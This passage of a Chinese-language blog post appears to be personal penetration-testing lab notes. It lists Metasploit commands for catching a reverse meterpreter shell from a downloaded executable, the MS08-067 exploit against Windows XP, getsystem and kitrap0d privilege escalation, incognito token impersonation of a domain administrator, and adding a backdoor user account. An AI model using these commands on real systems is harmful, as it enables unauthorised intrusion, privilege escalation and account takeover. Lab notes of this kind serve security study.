<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -l</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：load priv</code></strong> </li>
<li><strong><code>🔺命令：getsystem</code></strong> <ul>
<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-Token提权"><a href="#4-Token提权" class="headerlink" title="4. Token提权"></a>4. Token提权</h4><ul>
<li>Tokens<ul>
<li>用户每次登陆，账号绑定临时的Token</li>
<li>访问资源时提价Token进行身份验证，类似于WEB Cookie</li>
<li>Delegate Token：交互登陆会话（windowd的登陆界面、远程桌面）</li>
<li>Impersonate Token：非交互登陆会话（SMB协议访问文件共享目录）</li>
<li>Delegate Token：账号注销后变为Impersonate Token，权限依然有效<ul>
<li>▲ 域管理员登陆注销后，依然依存这Token</li>
</ul>
</li>
</ul>
</li>
<li>Incognito<ul>
<li>独立功能的软件，被MSF集成在meterpreter中</li>
<li>无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户</li>
<li>尤其适用于域环境下提权渗透多操作系统</li>
</ul>
</li>
<li>搭建域环境<ul>
<li>▲ 2020.03.03 因搭建实验环境需要重启启动机器+硬盘空间所剩不足+XP和2003的有效期已经过了，故这次实验先暂且放一放</li>
<li>Window Server 2003<ul>
<li>配置静态IP地址，DNS服务器指向自己</li>
<li>运行域程序的安装：dcpromo（安装过程需要光盘）</li>
<li>DNS全名：lab.com</li>
<li>重新启动服务器</li>
<li>分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>关闭防火墙 → 配置静态IP地址（DNS指向域控制器）</li>
<li>我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）</li>
<li>重新启动机器</li>
<li>用域账号Administrator登陆，关闭防火墙</li>
<li>再用域账号u1登陆</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>Win+R → \Window XP SP3的IP\c$ → 进行操作</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：load incognito</code></strong><ul>
<li>使用伪装Token需要提权为本地SYSTEM权限</li>
<li>查看组的Token：<strong><code>🔺命令：list_tokens -u</code></strong></li>
<li>伪装Token：<strong><code>🔺命令：impersonate_token lab\\administrator</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：execute -f cmd.exe -i -t</code></strong> # -t：使用当前假冒token执行程序</li>
<li><strong><code>🔺命令：shell</code></strong><ul>
<li><strong><code>🔺命令：net user a a /add</code></strong>（增加账号尝试）</li>
</ul>
</li>
</ul>
</li>
<li>▲ 本地普通权限用户需先本地提权<ul>
<li><strong><code>🔺命令：use exploit/windows/local/ms10_015_kitrap0d</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/2/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">135</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">120.3k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
